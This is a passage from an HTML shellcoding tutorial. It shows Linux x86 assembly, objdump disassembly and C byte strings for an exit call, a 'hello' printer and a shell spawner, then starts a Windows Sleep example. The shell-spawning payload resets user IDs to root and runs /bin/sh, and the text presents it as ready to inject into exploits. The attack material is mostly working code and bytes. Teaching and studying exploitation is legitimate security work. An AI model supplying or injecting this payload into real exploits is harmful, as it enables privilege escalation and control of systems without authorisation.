&nbsp;8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 db</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ebx,%ebx
&nbsp;8048084:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>cd 80</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80</font>
</pre>
<font size="3" face="Courier New">The bytes we need are <b>b0 01 31 db cd 80</b>.</font><p>
<font size="3" face="Courier New">Replace the code at the top with:</font><font size="3" face="Courier New"><b><br>char code[] = "\xb0\x01\x31\xdb\xcd\x80";</b> </font>


</p><p><font face="Courier New">Now, run the program. We have a successful piece of 
shellcode! One can strace the program to ensure that it
is calling exit. </font>


</p><h4><font face="Courier New"><a name="linex2">Example 2 - Saying Hello</a></font></h4>
<p> <font face="Courier New">For this next piece, let's ease our way into something useful. In this block of code one will find an example
on how to load the address of a string in a piece of our code at runtime. This is important because while running
shellcode in an unknown environment, the address of the string will be unknown because the program is not running
in its normal address space. </font></p>
<hr>
<pre><font face="Courier New">;<i>hello.asm</i>
[SECTION .text]

global _start


_start:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp short ender

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; starter:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax, eax&nbsp;&nbsp;&nbsp; ;clean up the registers
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ebx, ebx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor edx, edx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ecx, ecx

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al, 4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;syscall write
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov bl, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;stdout is 1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;get the address of the string from the stack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov dl, 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;length of the string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax, eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;exit the shellcode
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ebx,ebx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ender:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call starter	;put the address of the string on the stack
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 'hello'</font>

</pre>
<hr>
<font face="Courier New"><br>
</font><pre><font face="Courier New">steve hanna@1337b0x:~$ <b>nasm -f elf hello.asm</b>
steve hanna@1337b0x:~$ <b>ld -o hello hello.o</b>
steve hanna@1337b0x:~$ <b>objdump -d hello</b>

hello:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
&nbsp;8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eb 19</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 804809b <two>

08048082 &lt;starter&gt;:
&nbsp;8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048084:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 db</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ebx,%ebx
&nbsp;8048086:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 d2</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %edx,%edx
&nbsp;8048088:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c9</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ecx,%ecx
&nbsp;804808a:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b0 04</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x4,%al
&nbsp;804808c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b3 01</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1,%bl
&nbsp;804808e:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>59</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ecx
&nbsp;804808f:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b2 05</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x5,%dl
&nbsp;8048091:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>cd 80</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80
&nbsp;8048093:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048095:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b0 01</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1,%al
&nbsp;8048097:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 db</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ebx,%ebx
&nbsp;8048099:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>cd 80</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80

0804809b &lt;ender&gt;:
&nbsp;804809b:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 e2 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 8048082 <one>
&nbsp;80480a0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>68 65 6c 6c 6f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push&nbsp;&nbsp; $0x6f6c6c65


Replace the code at the top with:
<b>char code[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd"\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f";</b></one></two></font></pre>
<pre><font face="Courier New"><b>
</b><font size="3">At this point we have a fully functional piece of shellcode that outputs to stdout.
Now that dynamic string addressing has been demonstrated as well as the ability to zero
out registers, we can move on to a piece of code that gets us a shell.</font>

</font>
</pre>
<h4><font face="Courier New"><a name="linex3">Example 3 - Spawning a Shell</a></font></h4>
<p>
<font face="Courier New">&nbsp;&nbsp;&nbsp;
This code combines what we have been doing so far. This code attempts to set root privileges if they are dropped
and then spawns a shell. Note: system("/bin/sh") would have been a lot simpler right? Well the only problem with
that approach is the fact that system always drops privileges.
<br><br>Remember when reading this code: <br><i><b>&nbsp;&nbsp;&nbsp; execve </b>(<b>const char</b> *filename, <b>const char</b>** argv, <b>const char</b>** envp);</i><br>
<br>So, the second two argument expect pointers to pointers. That's why I
 load the address of the "/bin/sh" into the string memory and then
pass the address of the string memory to the function. When the pointers
 are dereferenced the target memory will be the "/bin/sh" string. </font></p>
<hr>
<pre><font face="Courier New"><i>;shellex.asm</i>
[SECTION .text]

global _start


_start:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax, eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al, 70&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;setreuid is syscall 70
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ebx, ebx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ecx, ecx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp short ender

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; starter:

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;get the address of the string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax, eax

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [ebx+7 ], al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;put a NULL where the N is in the string
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [ebx+8 ], ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;put the address of the string to where the
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;AAAA is
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [ebx+12], eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;put 4 null bytes into where the BBBB is
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al, 11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;execve is syscall 11
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea ecx, [ebx+8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;load the address of where the AAAA was
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea edx, [ebx+12]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;load the address of the NULLS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;call the kernel, WE HAVE A SHELL!

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ender:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call starter
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db '/bin/shNAAAABBBB'

</font>
</pre>
<hr>
<pre><font face="Courier New">steve hanna@1337b0x:~$ <b>nasm -f elf shellex.asm</b>
steve hanna@1337b0x:~$ <b>ld -o shellex shellex.o</b>
steve hanna@1337b0x:~$ <b>objdump -d shellex</b>

shellex:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
&nbsp;8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;8048082:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b0 46</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x46,%al
&nbsp;8048084:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 db</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ebx,%ebx
&nbsp;8048086:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c9</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %ecx,%ecx
&nbsp;8048088:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>cd 80</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80
&nbsp;804808a:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>eb 16</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 80480a2 <ender>

0804808c <starter>:
&nbsp;804808c:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>5b</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %ebx
&nbsp;804808d:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>31 c0</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp; %eax,%eax
&nbsp;804808f:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>88 43 07</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %al,0x7(%ebx)
&nbsp;8048092:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>89 5b 08</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %ebx,0x8(%ebx)
&nbsp;8048095:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>89 43 0c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; %eax,0xc(%ebx)
&nbsp;8048098:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b0 0b</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0xb,%al
&nbsp;804809a:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>8d 4b 08</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; 0x8(%ebx),%ecx
&nbsp;804809d:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>8d 53 0c</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea&nbsp;&nbsp;&nbsp; 0xc(%ebx),%edx
&nbsp;80480a0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>cd 80</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80

080480a2 <ender>:
&nbsp;80480a2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>e8 e5 ff ff ff</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; 804808c <starter>
&nbsp;80480a7:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>2f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das
&nbsp;80480a8:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>62 69 6e</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bound&nbsp; %ebp,0x6e(%ecx)
&nbsp;80480ab:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>2f</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; das
&nbsp;80480ac:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>73 68</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jae&nbsp;&nbsp;&nbsp; 8048116 <ender+0x74>
&nbsp;80480ae:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>58</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop&nbsp;&nbsp;&nbsp; %eax
&nbsp;80480af:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480b0:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480b1:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480b2:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>41</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %ecx
&nbsp;80480b3:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %edx
&nbsp;80480b4:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %edx
&nbsp;80480b5:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %edx
&nbsp;80480b6:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>42</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %edx
Replace the code at the top with:
<br><b>char code[] = "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb"\
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89"\
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd"\
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x73\x68\x58\x41\x41\x41\x41\x42\x42\x42\x42";</b></ender+0x74></starter></ender></starter></ender></font></pre>

<pre><font size="3" face="Courier New">This code produces a fully functional shell when injected into an exploit
and demonstrates most of the skills needed to write successful shellcode. Be
aware though, the better one is at assembly, the more functional, robust,
and most of all evil, one's code will be.</font></pre>
<pre>&nbsp;</pre>
<pre>&nbsp;</pre>
<pre></pre>
<h2><font face="Courier New"><a name="ws">Windows Shellcoding</a></font></h2>
<h4><font face="Courier New"><a name="win32ex1">Example 1 - Sleep is for the Weak!</a></font></h4>
<p>
	<font face="Courier New">&nbsp;&nbsp;&nbsp; In order to write 
successful code, we first need to decide what functions we wish to use 
for this shellcode
and then find their absolute addresses. For this example we just want a 
thread to sleep for an allotted amount of time. Let's load up arwin 
(found above) and get started. Remember, the only module guaranteed to 
be mapped into the processes address space is kernel32.dll. So for this 
example, Sleep seems to be the simplest function, accepting the amount 
of time the thread should suspend as its only argument.</font></p>

<pre><font face="Courier New">G:\&gt; <b>arwin kernel32.dll Sleep</b>
arwin - win32 address resolution program - by steve hanna - v.01
Sleep is located at <b>0x77e61bea</b> in kernel32.dll
</font>
</pre>
<hr>
<pre><font face="Courier New">;<i>sleep.asm</i>
[SECTION .text]

global _start


_start:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax,eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ebx, 0x77e61bea ;address of Sleep
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov ax, 5000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;pause for 5000ms
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push eax
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;Sleep(ms);

</font>
</pre>
<hr>
<pre><font face="Courier New">steve hanna@1337b0x:~$ <b>nasm -f elf sleep.asm; ld -o sleep sleep.o; objdump -d sleep</b>
sleep:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
